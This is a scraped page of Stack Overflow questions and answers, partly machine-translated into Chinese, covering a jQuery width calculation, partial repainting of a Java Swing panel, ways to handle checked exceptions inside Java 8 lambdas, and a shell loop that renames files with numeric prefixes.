您不需要删除 px。你的脚本是错误的。这应该可以帮助您-

[**演示**](http://jsfiddle.net/pxWnY/1/)

```
<div id="MainDiv"></div> 
```

CSS

```
#MainDiv
{
    position:relative;    
    left:60px;
    right:50px;
    border:1px solid;
    height:10px;
    background-color: yellow;
} 
```

jQuery

```
$("document").ready(function() {
    $("#MainDiv").width(parseInt($("#MainDiv").css("left")) - parseInt($("#MainDiv").css("right")));
}); 
```

# java - how to update/ repaint jpanel partially (background stuff is not painted again.it remains there as it is)

> ID：14039992
> 
> 赞同：0
> 
> 时间：2012-12-26T11:31:55.043
> 
> 标签：java, swing

We are developing Graphics based application where we need to call repaint method again and again. Now repaint method repaints the whole screen but we want it to repaint only a portion of the Screen keeping reamaining part painted. Is it possible ? if yes then how ?

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T11:57:46.600

您可以尝试重载形式的`repaint()`方法，例如[重绘到特定的矩形](http://docs.oracle.com/javase/7/docs/api/javax/swing/JComponent.html#repaint%28java.awt.Rectangle%29)

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-26T11:58:33.807

我不知道我的理解是否正确，但我首先想到的是覆盖 JPanel 中的 paint() 方法。如果您不清除此方法中的 JPanel，您可以在现有绘图上进行绘制。但是，这种逻辑似乎非常令人厌烦，我宁愿建议使用多个 JPanel 并将它们中的每一个用作大型 JPanel 场景中的实体。这将允许您重新绘制每个实体，然后将它们组合到您想要的场景中。

# java - Java 8：在 lambda 表达式中强制检查异常处理。为什么是强制性的，而不是可选的？

> ID：14039995
> 
> 赞同：69
> 
> 时间：2012-12-26T11:32:09.770
> 
> 标签：java, lambda, checked-exceptions, java-8

我正在使用 Java 8 中的新 lambda 功能，发现 Java 8 提供的实践非常有用。但是，我想知道是否有一种解决以下方案的*好方法。*假设您有一个对象池包装器，它需要某种工厂来填充对象池，例如（使用`java.lang.functions.Factory`）：

```
public class JdbcConnectionPool extends ObjectPool<Connection> {

    public ConnectionPool(int maxConnections, String url) {
        super(new Factory<Connection>() {
            @Override
            public Connection make() {
                try {
                    return DriverManager.getConnection(url);
                } catch ( SQLException ex ) {
                    throw new RuntimeException(ex);
                }
            }
        }, maxConnections);
    }

} 
```

将函数式接口转化为 lambda 表达式后，上面的代码变成了这样：

```
public class JdbcConnectionPool extends ObjectPool<Connection> {

    public ConnectionPool(int maxConnections, String url) {
        super(() -> {
            try {
                return DriverManager.getConnection(url);
            } catch ( SQLException ex ) {
                throw new RuntimeException(ex);
            }
        }, maxConnections);
    }

} 
```

确实没那么糟糕，但是检查的异常`java.sql.SQLException`需要lambda 内的`try`/块。`catch`在我公司，我们长期使用两个接口：

*   `IOut<T>`相当于`java.lang.functions.Factory`;
*   以及通常需要检查异常传播的情况的特殊接口：`interface IUnsafeOut<T, E extends Throwable> { T out() throws E; }`.

两者`IOut<T>`和`IUnsafeOut<T>`都应该在迁移到 Java 8 期间被删除，但是没有完全匹配的`IUnsafeOut<T, E>`. 如果 lambda 表达式可以像未检查一样处理已检查的异常，则可以在上面的构造函数中像下面这样简单地使用：

```
super(() -> DriverManager.getConnection(url), maxConnections); 
```

这样看起来干净多了。我看到我可以重写`ObjectPool`超类来接受我们的`IUnsafeOut<T>`，但据我所知，Java 8 还没有完成，所以可能会有一些变化，比如：

*   实现类似的东西`IUnsafeOut<T, E>`？（老实说，我认为这很脏 - 主题必须选择接受什么：要么`Factory`或不能具有兼容方法签名的“不安全工厂”）
*   只是忽略 lambdas 中的检查异常，所以不需要`IUnsafeOut<T, E>`代理？（为什么不呢？例如另一个重要的变化：我使用的 OpenJDK`javac`现在不需要将变量和参数声明为`final`在匿名类 [功能接口] 或 lambda 表达式中捕获）

所以问题通常是：有没有办法绕过 lambdas 中的已检查异常，还是在 Java 8 最终发布之前计划在将来？

* * *

更新 1

嗯，据我了解我们目前所拥有的，目前似乎没有办法，尽管引用的文章是 2010 年的：[Brian Goetz 解释 Java 中的异常透明度](https://web.archive.org/web/20170313093438/blogs.oracle.com/briangoetz/entry/exception_transparency_in_java)。如果在 Java 8 中没有发生太大变化，这可以被视为一个答案。Brian 还说`interface ExceptionalCallable<V, E extends Exception>`（我提到`IUnsafeOut<T, E extends Throwable>`的代码遗留问题）几乎没有用，我同意他的观点。

我还想念别的东西吗？

* * *

## 回答 #1

> 赞同：49
> 
> 时间：2012-12-26T20:00:40.057

不确定我是否真的回答了你的问题，但你不能简单地使用类似的东西吗？

```
public final class SupplierUtils {
    private SupplierUtils() {
    }

    public static <T> Supplier<T> wrap(Callable<T> callable) {
        return () -> {
            try {
                return callable.call();
            }
            catch (RuntimeException e) {
                throw e;
            }
            catch (Exception e) {
                throw new RuntimeException(e);
            }
        };
    }
}

public class JdbcConnectionPool extends ObjectPool<Connection> {

    public JdbcConnectionPool(int maxConnections, String url) {
        super(SupplierUtils.wrap(() -> DriverManager.getConnection(url)), maxConnections);
    }
} 
```

* * *

## 回答 #2

> 赞同：34
> 
> 时间：2014-03-27T13:59:03.033

在 lambda 邮件列表中对此进行[了彻底的讨论](http://mail.openjdk.java.net/pipermail/lambda-dev/2013-January/007660.html)。正如您所看到的那样，Brian Goetz 建议替代方法是编写您自己的组合器：

> 或者您可以编写自己的简单组合器：
> 
> ```
> static<T> Supplier<T> exceptionWrappingSupplier(Supplier<T> b) {
>      return e -> {
>          try { b.accept(e); }
>          catch (Exception e) { throw new RuntimeException(e); }
>      };
> } 
> ```
> 
> 您可以编写一次，花费的时间少于编写原始电子邮件的时间。同样，对于您使用的每种 SAM 一次。
> 
> 我宁愿我们将其视为“99% 满的玻璃杯”，而不是替代方案。并非所有问题都需要新的语言特性作为解决方案。（更不用说新的语言特性总是会导致新的问题。）

在那些日子里，消费者接口被称为 Block。

我认为这与[JB Nizet 的回答](https://stackoverflow.com/questions/14039995/java-8-mandatory-checked-exceptions-handling-in-lambda-expressions-for-standard/14045585#14045585)相对应。

后来布赖恩[解释了为什么](http://mail.openjdk.java.net/pipermail/lambda-dev/2013-January/007662.html)这样设计（问题的原因）

> 是的，您必须提供自己的特殊 SAM。但随后 lambda 转换将适用于它们。
> 
> EG 讨论了对这个问题的额外语言和库支持，最后认为这是一个糟糕的成本/收益权衡。
> 
> 基于库的解决方案导致 SAM 类型（例外与非例外）的 2 倍爆炸式增长，这与现有的原始专业化组合爆炸式交互非常糟糕。
> 
> 可用的基于语言的解决方案是复杂性/价值权衡的失败者。尽管我们将继续探索一些替代解决方案——尽管显然不是针对 8，也可能不是针对 9。
> 
> 与此同时，你拥有做你想做的事的工具。我知道您更喜欢我们为您提供最后一英里（其次，您的请求实际上是一个隐晦的请求，即“您为什么不已经放弃检查的异常”），但我认为当前状态让你完成你的工作。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-09-02T17:52:58.383

**2015 年 9 月：**

您可以为此使用[ET 。](https://github.com/mscharhag/ET)ET 是一个用于异常转换/翻译的小型 Java 8 库。

使用 ET，您可以编写：

```
super(() -> et.withReturningTranslation(() -> DriverManager.getConnection(url)), maxConnections); 
```

多行版本：

```
super(() -> {
  return et.withReturningTranslation(() -> DriverManager.getConnection(url));
}, maxConnections); 
```

您之前需要做的就是创建一个新`ExceptionTranslator`实例：

```
ExceptionTranslator et = ET.newConfiguration().done(); 
```

这个实例是线程安全的，可以被多个组件共享。您可以根据需要配置更具体的异常转换规则（例如`FooCheckedException -> BarRuntimeException`）。如果没有其他规则可用，检查的异常会自动转换为`RuntimeException`.

（免责声明：我是 ET 的作者）

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2016-04-04T05:31:44.803

我们在我的公司开发了一个内部项目，帮助我们解决了这个问题。我们决定在两个月前上市。

这是我们想出的：

```
@FunctionalInterface
public interface ThrowingFunction<T,R,E extends Throwable> {
R apply(T arg) throws E;

/**
 * @param <T> type
 * @param <E> checked exception
 * @return a function that accepts one argument and returns it as a value.
 */
static <T, E extends Exception> ThrowingFunction<T, T, E> identity() {
    return t -> t;
}

/**
 * @return a Function that returns the result of the given function as an Optional instance.
 * In case of a failure, empty Optional is returned
 */
static <T, R, E extends Exception> Function<T, Optional<R>> lifted(ThrowingFunction<T, R, E> f) {
    Objects.requireNonNull(f);

    return f.lift();
}

static <T, R, E extends Exception> Function<T, R> unchecked(ThrowingFunction<T, R, E> f) {
    Objects.requireNonNull(f);

    return f.uncheck();
}

default <V> ThrowingFunction<V, R, E> compose(final ThrowingFunction<? super V, ? extends T, E> before) {
    Objects.requireNonNull(before);

    return (V v) -> apply(before.apply(v));
}

default <V> ThrowingFunction<T, V, E> andThen(final ThrowingFunction<? super R, ? extends V, E> after) {
    Objects.requireNonNull(after);

    return (T t) -> after.apply(apply(t));
}

/**
 * @return a Function that returns the result as an Optional instance. In case of a failure, empty Optional is
 * returned
 */
default Function<T, Optional<R>> lift() {
    return t -> {
        try {
            return Optional.of(apply(t));
        } catch (Throwable e) {
            return Optional.empty();
        }
    };
}

/**
 * @return a new Function instance which wraps thrown checked exception instance into a RuntimeException
 */
default Function<T, R> uncheck() {
    return t -> {
        try {
            return apply(t);
        } catch (final Throwable e) {
            throw new WrappedException(e);
        }
    };
} 
```

}

[https://github.com/TouK/ThrowingFunction/](https://github.com/TouK/ThrowingFunction/)

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2013-08-08T20:16:04.877

您是否考虑过使用 RuntimeException（未检查）包装类将原始异常从 lambda 表达式中偷运出来，然后将包装的异常转换*回*其原始检查异常？

```
class WrappedSqlException extends RuntimeException {
    static final long serialVersionUID = 20130808044800000L;
    public WrappedSqlException(SQLException cause) { super(cause); }
    public SQLException getSqlException() { return (SQLException) getCause(); }
}

public ConnectionPool(int maxConnections, String url) throws SQLException {
    try {
        super(() -> {
            try {
                return DriverManager.getConnection(url);
            } catch ( SQLException ex ) {
                throw new WrappedSqlException(ex);
            }
        }, maxConnections);
    } catch (WrappedSqlException wse) {
        throw wse.getSqlException();
    }
} 
```

创建您自己的唯一类应防止将另一个未经检查的异常误认为是您包装在 lambda 中的异常，即使该异常在您捕获并重新抛出它之前已在管道中的某处序列化。

嗯...我在这里看到的唯一问题是您在构造函数中执行此操作并调用 super() ，根据法律，它必须是构造函数中的第一条语句。是否`try`算作先前的陈述？我在自己的代码中有这个工作（没有构造函数）。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-01-13T17:54:06.173

以所述方式包装异常不起作用。我试过了，还是编译器报错，其实是按照规范的：lambda表达式抛出了与方法参数的目标类型不兼容的异常：Callable; call() 不会抛出它，所以我不能将 lambda 表达式作为 Callable 传递。

所以基本上没有解决方案：我们坚持编写样板文件。我们唯一能做的就是表达我们认为这需要修复的意见。我认为规范不应该仅仅基于不兼容的抛出异常盲目地丢弃目标类型：它应该随后检查抛出的不兼容异常是否在调用范围内被捕获或声明为 throws。对于未内联的 lambda 表达式，我建议我们可以将它们标记为静默抛出已检查异常（静默意味着编译器不应检查，但运行时仍应捕获）。让我们用 => 标记那些，而不是 -> 我知道这不是一个讨论网站，但由于这是问题的唯一解决方案，让我们听到自己的声音，让我们改变这个规范！

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2015-10-29T19:34:32.957

[Paguro 提供了包装检查异常的功能接口](https://github.com/GlenKPeterson/Paguro)。在您提出问题几个月后，我开始着手研究它，所以您可能是它灵感的一部分！

您会注意到 Paguro 中只有 4 个功能接口，而 Java 8 包含 43 个接口。这是因为 Paguro 更喜欢泛型而不是原语。

Paguro 在其不可变集合中内置了单通道转换（从 Clojure 复制）。这些转换大致相当于 Clojure 转换器或 Java 8 流，但它们接受包装检查异常的功能接口。请参阅：[Paguro 和 Java 8 流之间的区别](https://github.com/GlenKPeterson/Paguro/wiki/Comparison-with-Streams-and-Lambdas-in-JDK8)。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2017-10-19T20:00:42.207

你*可以*从你的 lambdas 中抛出，它们只需要“以你自己的方式”声明（不幸的是，这使得它们不能在标准 JDK 代码中重用，但是嘿，我们尽我们所能）。

```
@FunctionalInterface
public interface SupplierIOException {
   MyClass get() throws IOException;
} 
```

或者更通用的版本：

```
public interface ThrowingSupplier<T, E extends Exception> {
  T get() throws E;
} 
```

参考[这里](https://stackoverflow.com/a/27644392/32453)。还提到了使用“sneakyThrow”来不声明检查的异常，但仍然抛出它们。这让我有点头疼，也许是一个选择。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2021-10-07T14:05:49.890

[jOOλ](https://github.com/jOOQ/jOOL)是一个库，它支持将各种抛出检查异常的功能接口包装到等效的 JDK 功能接口中。例如：

```
// Wraps the checked exception in an unchecked one:
Supplier<Class<?>> supplier = Unchecked.supplier(() -> Class.forName("com.example.X"));

// Re-throws the checked exception without compile time checking:
Supplier<Class<?>> supplier = Sneaky.supplier(() -> Class.forName("com.example.X")); 
```

[我在这篇博文中做了更多的例子](https://blog.jooq.org/use-joo%CE%BBs-sneaky-throw-to-avoid-checked-exceptions/)。免责声明：我制作了 jOOλ

# shell - Renaming Multiples Files with Different Names in a Directory using shell

> ID：14039998
> 
> 赞同：0
> 
> 时间：2012-12-26T11:32:19.223
> 
> 标签：shell, rename, file-rename

I've found most of the questions of this kind where the change in name has been same for the entire set of files in that directory. But i'm here presented with a situation to give a different name to every file in that directory or just add a different prefix.

For Example, I have about 200 files in a directory, all of them with numbers in their filename. what i want to do is add a prefix of 1 to 200 for every file. Like 1_xxxxxxxx.png,2_xxxxxxxx.png...........200_xxxxxxxx.png

I'm trying this, but it doesnt increment my $i everytime, rather it gives a prefix of 1_ to every file.

```
echo "renaming files" 
i=1                                             #initializing
j=ls -1 | wc -l                                 #Count number of files in that dir
while [ "$i" -lt "$j" ]                         #looping 
do
    for FILE in * ; do NEWFILE=`echo $i_$FILE`; #swapping the file with variable $i
    mv $FILE $NEWFILE                           #doing the actual rename
    i=`expr $i+1`                               #increment $i
done 
```

Thanks for any suggestion/help.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:42:40.890

要增加`expr`，你肯定需要空格（`expr $i + 1`），但你最好只做：

```
echo "renaming files" 
i=1
for FILE in * ; do
    mv $FILE $((i++))_$FILE
done 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T11:56:29.833

```
i=1
for f in *; do
  mv -- "$f" "${i}_$f"
  i=$(($i + 1))
done 
```